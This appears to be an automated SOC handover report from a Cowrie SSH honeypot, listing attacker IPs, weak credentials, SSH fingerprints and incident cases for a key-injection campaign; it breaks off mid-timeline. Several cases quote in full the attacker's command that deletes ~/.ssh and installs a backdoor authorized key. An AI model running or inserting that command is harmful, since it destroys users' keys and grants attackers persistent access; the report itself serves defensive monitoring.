# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-24 |
| **Generated At** | 2026-04-24T20:55:37Z |
| **Shift Time** | 20:55 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **118** |
| Confirmed Threats | **102** |
| False Positives Filtered | **16** (13.6%) |
| Unique Attacker IPs | **15** |
| Countries of Origin | **11** |
| High Severity Cases | **14** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **104** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **21** |
| Unique Credential Pairs | **11** |
| Unique Usernames | **4** |
| Unique Passwords | **11** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 14 |
| `345gs5662d34` | 5 |
| `deploy` | 1 |
| `myuser` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 7 |
| `345gs5662d34` | 5 |
| `Bj123456` | 1 |
| `Root12345.` | 1 |
| `Passw0rd` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 7 |
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `Bj123456` | 1 |
| `root` | `Root12345.` | 1 |
| `deploy` | `Passw0rd` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Bj123456` | `79.104.0.82` | 2026-04-24T19:59:19 |
| `root` | `3245gs5662d34` | `79.104.0.82` | 2026-04-24T19:59:23 |
| `root` | `Root12345.` | `34.131.63.3` | 2026-04-24T20:27:36 |
| `root` | `3245gs5662d34` | `34.131.63.3` | 2026-04-24T20:27:38 |
| `root` | `123456Yy` | `79.104.0.82` | 2026-04-24T20:31:21 |
| `root` | `root2018@123` | `103.120.227.88` | 2026-04-24T20:34:58 |
| `root` | `3245gs5662d34` | `103.120.227.88` | 2026-04-24T20:35:12 |
| `root` | `qwe321` | `103.120.227.88` | 2026-04-24T20:35:43 |
| `root` | `Aa112211.` | `103.120.227.88` | 2026-04-24T20:36:01 |
| `root` | `!@#qweQWE` | `103.120.227.88` | 2026-04-24T20:36:19 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **118** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 49 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 35 | 3 |
| `af8223ac9914...` | libssh-based | 10 | 3 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 35 | 3 | Modern SSH client |
| `af8223ac9914...` | libssh | 10 | 3 | libssh-based |
| `95420f9d932d...` | libssh | 3 | 2 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 3 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `79.104.0.82`, `103.120.227.88`, `34.131.63.3`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.120.227.88`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **15** |
| Unique ASNs | **14** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS44489` | STARNET, s.r.o. | 1 | LOW |
| `AS142647` | Nasstec Airnet Networks Private Limited | 1 | HIGH |
| `AS396982` | Google LLC | 1 | HIGH |
| `AS329165` | Wild Peach Trading 52 (PTY) LTD | 1 | HIGH |
| `AS14593` | Space Exploration Technologies Corporation | 1 | LOW |
| `AS202412` | Omegatech LTD | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (14)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-49b68d13b5b0

| Field | Detail |
|---|---|
| **Source IP** | `79.104.0[.]82` |
| **First Seen** | 2026-04-24 19:59 |
| **Last Seen** | 2026-04-24 19:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 19:59:18` | `cowrie.session.connect` |
| `2026-04-24 19:59:18` | `cowrie.client.version` |
| `2026-04-24 19:59:18` | `cowrie.client.kex` |
| `2026-04-24 19:59:19` | `cowrie.login.success` |
| `2026-04-24 19:59:19` | `cowrie.session.params` |
| `2026-04-24 19:59:19` | `cowrie.command.input` |
| `2026-04-24 19:59:19` | `cowrie.command.failed` |
| `2026-04-24 19:59:19` | `cowrie.log.closed` |
| `2026-04-24 19:59:20` | `cowrie.session.params` |
| `2026-04-24 19:59:20` | `cowrie.command.input` |
| `2026-04-24 19:59:20` | `cowrie.session.file_download` |
| `2026-04-24 19:59:20` | `cowrie.log.closed` |
| `2026-04-24 19:59:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.104.0[.]82` to AbuseIPDB if not already reported
- [ ] Block `79.104.0[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39f5010b4661

| Field | Detail |
|---|---|
| **Source IP** | `79.104.0[.]82` |
| **First Seen** | 2026-04-24 19:59 |
| **Last Seen** | 2026-04-24 19:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 19:59:22` | `cowrie.session.connect` |
| `2026-04-24 19:59:22` | `cowrie.client.version` |
| `2026-04-24 19:59:23` | `cowrie.client.kex` |
| `2026-04-24 19:59:23` | `cowrie.login.success` |
| `2026-04-24 19:59:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.104.0[.]82` to AbuseIPDB if not already reported
- [ ] Block `79.104.0[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60349b3391cf

| Field | Detail |
|---|---|
| **Source IP** | `34.131.63[.]3` |
| **First Seen** | 2026-04-24 20:27 |
| **Last Seen** | 2026-04-24 20:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 20:27:36` | `cowrie.session.connect` |
| `2026-04-24 20:27:36` | `cowrie.client.version` |
| `2026-04-24 20:27:36` | `cowrie.client.kex` |
| `2026-04-24 20:27:36` | `cowrie.login.success` |
| `2026-04-24 20:27:36` | `cowrie.session.params` |
| `2026-04-24 20:27:36` | `cowrie.command.input` |
| `2026-04-24 20:27:36` | `cowrie.command.failed` |
| `2026-04-24 20:27:36` | `cowrie.log.closed` |
| `2026-04-24 20:27:36` | `cowrie.session.params` |
| `2026-04-24 20:27:36` | `cowrie.command.input` |
| `2026-04-24 20:27:36` | `cowrie.session.file_download` |
| `2026-04-24 20:27:36` | `cowrie.log.closed` |
| `2026-04-24 20:27:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.131.63[.]3` to AbuseIPDB if not already reported
- [ ] Block `34.131.63[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d22c868a82b7

| Field | Detail |
|---|---|
| **Source IP** | `34.131.63[.]3` |
| **First Seen** | 2026-04-24 20:27 |
| **Last Seen** | 2026-04-24 20:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 20:27:37` | `cowrie.session.connect` |
| `2026-04-24 20:27:37` | `cowrie.client.version` |
| `2026-04-24 20:27:37` | `cowrie.client.kex` |
| `2026-04-24 20:27:38` | `cowrie.login.success` |
| `2026-04-24 20:27:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.131.63[.]3` to AbuseIPDB if not already reported
- [ ] Block `34.131.63[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75260843ac85

| Field | Detail |
|---|---|
| **Source IP** | `79.104.0[.]82` |
| **First Seen** | 2026-04-24 20:31 |
| **Last Seen** | 2026-04-24 20:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 20:31:20` | `cowrie.session.connect` |
| `2026-04-24 20:31:20` | `cowrie.client.version` |
| `2026-04-24 20:31:20` | `cowrie.client.kex` |
| `2026-04-24 20:31:21` | `cowrie.login.success` |
| `2026-04-24 20:31:21` | `cowrie.session.params` |
| `2026-04-24 20:31:21` | `cowrie.command.input` |
| `2026-04-24 20:31:21` | `cowrie.command.failed` |
| `2026-04-24 20:31:21` | `cowrie.log.closed` |
| `2026-04-24 20:31:22` | `cowrie.session.params` |
| `2026-04-24 20:31:22` | `cowrie.command.input` |
| `2026-04-24 20:31:22` | `cowrie.session.file_download` |
| `2026-04-24 20:31:22` | `cowrie.log.closed` |
| `2026-04-24 20:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.104.0[.]82` to AbuseIPDB if not already reported
- [ ] Block `79.104.0[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae03fb375fae

| Field | Detail |
|---|---|
| **Source IP** | `79.104.0[.]82` |
| **First Seen** | 2026-04-24 20:31 |
| **Last Seen** | 2026-04-24 20:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 20:31:24` | `cowrie.session.connect` |
| `2026-04-24 20:31:24` | `cowrie.client.version` |
| `2026-04-24 20:31:24` | `cowrie.client.kex` |
| `2026-04-24 20:31:25` | `cowrie.login.success` |
| `2026-04-24 20:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.104.0[.]82` to AbuseIPDB if not already reported
- [ ] Block `79.104.0[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-173d50b35f70

| Field | Detail |
|---|---|
| **Source IP** | `103.120.227[.]88` |
| **First Seen** | 2026-04-24 20:34 |
| **Last Seen** | 2026-04-24 20:35 |
| **Session Duration** | 48s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 20:34:55` | `cowrie.session.connect` |
| `2026-04-24 20:34:55` | `cowrie.client.version` |
| `2026-04-24 20:34:57` | `cowrie.client.kex` |
| `2026-04-24 20:34:58` | `cowrie.login.success` |
| `2026-04-24 20:34:59` | `cowrie.session.params` |
| `2026-04-24 20:34:59` | `cowrie.command.input` |
| `2026-04-24 20:34:59` | `cowrie.command.failed` |
| `2026-04-24 20:34:59` | `cowrie.log.closed` |
| `2026-04-24 20:35:44` | `cowrie.session.params` |
| `2026-04-24 20:35:44` | `cowrie.command.input` |
| `2026-04-24 20:35:44` | `cowrie.session.file_download` |
| `2026-04-24 20:35:44` | `cowrie.log.closed` |
| `2026-04-24 20:35:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.120.227[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.120.227[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0ba9fec6aa8

| Field | Detail |
|---|---|
| **Source IP** | `103.120.227[.]88` |
| **First Seen** | 2026-04-24 20:35 |
| **Last Seen** | 2026-04-24 20:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 20:35:11` | `cowrie.session.connect` |
| `2026-04-24 20:35:11` | `cowrie.client.version` |
| `2026-04-24 20:35:12` | `cowrie.client.kex` |
| `2026-04-24 20:35:12` | `cowrie.login.success` |
| `2026-04-24 20:35:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.120.227[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.120.227[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae40f7e20d2b

| Field | Detail |
|---|---|
| **Source IP** | `103.120.227[.]88` |
| **First Seen** | 2026-04-24 20:35 |
| **Last Seen** | 2026-04-24 20:35 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 20:35:39` | `cowrie.session.connect` |
| `2026-04-24 20:35:39` | `cowrie.client.version` |
| `2026-04-24 20:35:40` | `cowrie.client.kex` |
| `2026-04-24 20:35:43` | `cowrie.login.success` |
| `2026-04-24 20:35:43` | `cowrie.session.params` |
| `2026-04-24 20:35:43` | `cowrie.command.input` |
| `2026-04-24 20:35:43` | `cowrie.command.failed` |
| `2026-04-24 20:35:43` | `cowrie.log.closed` |
| `2026-04-24 20:35:46` | `cowrie.session.params` |
| `2026-04-24 20:35:46` | `cowrie.command.input` |
| `2026-04-24 20:35:49` | `cowrie.session.file_download` |
| `2026-04-24 20:35:49` | `cowrie.log.closed` |
| `2026-04-24 20:35:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.120.227[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.120.227[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78d771598c62

| Field | Detail |
|---|---|
| **Source IP** | `103.120.227[.]88` |
| **First Seen** | 2026-04-24 20:35 |
| **Last Seen** | 2026-04-24 20:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 20:35:51` | `cowrie.session.connect` |
| `2026-04-24 20:35:51` | `cowrie.client.version` |
| `2026-04-24 20:35:51` | `cowrie.client.kex` |
| `2026-04-24 20:35:52` | `cowrie.login.success` |
| `2026-04-24 20:35:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.120.227[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.120.227[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db10abf372d0

| Field | Detail |
|---|---|
| **Source IP** | `103.120.227[.]88` |
| **First Seen** | 2026-04-24 20:35 |
| **Last Seen** | 2026-04-24 20:36 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 20:35:59` | `cowrie.session.connect` |
| `2026-04-24 20:35:59` | `cowrie.client.version` |
| `2026-04-24 20:36:00` | `cowrie.client.kex` |
| `2026-04-24 20:36:01` | `cowrie.login.success` |
| `2026-04-24 20:36:08` | `cowrie.session.params` |
| `2026-04-24 20:36:08` | `cowrie.command.input` |
| `2026-04-24 20:36:08` | `cowrie.session.file_download` |
| `2026-04-24 20:36:08` | `cowrie.log.closed` |
| `2026-04-24 20:36:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.120.227[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.120.227[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e431958a0bc2

| Field | Detail |
|---|---|
| **Source IP** | `103.120.227[.]88` |
| **First Seen** | 2026-04-24 20:36 |
| **Last Seen** | 2026-04-24 20:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 20:36:10` | `cowrie.session.connect` |
| `2026-04-24 20:36:10` | `cowrie.client.version` |
| `2026-04-24 20:36:10` | `cowrie.client.kex` |
| `2026-04-24 20:36:11` | `cowrie.login.success` |
| `2026-04-24 20:36:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.120.227[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.120.227[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88a843630bd8

| Field | Detail |
|---|---|
| **Source IP** | `103.120.227[.]88` |
| **First Seen** | 2026-04-24 20:36 |
| **Last Seen** | 2026-04-24 20:36 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 20:36:18` | `cowrie.session.connect` |
| `2026-04-24 20:36:18` | `cowrie.client.version` |
| `2026-04-24 20:36:18` | `cowrie.client.kex` |
| `2026-04-24 20:36:19` | `cowrie.login.success` |
